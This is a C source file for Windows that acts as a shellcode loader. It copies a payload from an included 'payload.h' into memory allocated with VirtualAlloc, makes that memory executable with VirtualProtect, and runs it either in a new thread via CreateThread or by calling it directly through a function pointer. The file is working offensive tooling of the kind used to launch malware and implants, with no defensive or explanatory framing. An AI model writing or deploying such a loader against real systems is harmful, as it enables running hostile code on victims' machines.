#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>
#include "payload.h"



int thread_exec(){

	// Variable dwOldProtect, to store the old protection settings of a memory page.
	DWORD dwOldProtect = 0;

	// Pointer called exec_mem, to store the address of a block of executable memory.
	void *exec_mem;
	
	// Boolean to store the result of Virtual Protect
	BOOL result_vp;
	
	HANDLE hThread;
    
	// Call to Virtual Alloc to get new memory allocated the size of payload len
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (exec_mem == 0) {
		printf("Could not allocate memory for payload.\n");
		return -1;
	}
	
	printf("Executable Memory location : %p\n", (void *)exec_mem);

	RtlMoveMemory(exec_mem, payload, payload_len);
	
	result_vp = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &dwOldProtect);

	if ( result_vp != 0 ) {
		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(hThread, -1);
	}

	return 0;
}

int direct_exec() {

	// Variable dwOldProtect, to store the old protection settings of a memory page.
	DWORD dwOldProtect = 0;

	// Pointer called exec_mem, to store the address of a block of executable memory.
	VOID *exec_mem;

	// Boolean to store the result of Virtual Protect
	BOOL result_vp;

	// Call to Virtual Alloc to get new memory allocated the size of payload len
	exec_mem = VirtualAlloc(NULL, payload_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

	if (exec_mem == 0) {
		printf("Could not allocate memory for payload.\n");
		return -1;
	}

	printf("Executable Memory location : %p\n", (void *)exec_mem);

	// This code copies the contents of the payload into the executable memory block.
	RtlMoveMemory(exec_mem, payload, payload_len);

	// This code sets the protection settings of the executable memory block to PAGE_EXECUTE_READ using the VirtualProtect function. The previous protection settings are stored in dwOldProtect.
	result_vp = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &dwOldProtect);

	if ( result_vp != 0 ) {
		// This code casts the address of the executable memory block to a function pointer and calls the function using the dereference operator.
		((void(*)())exec_mem)();
	}
};


int main(void) {
    thread_exec();
	//direct_exec();
}
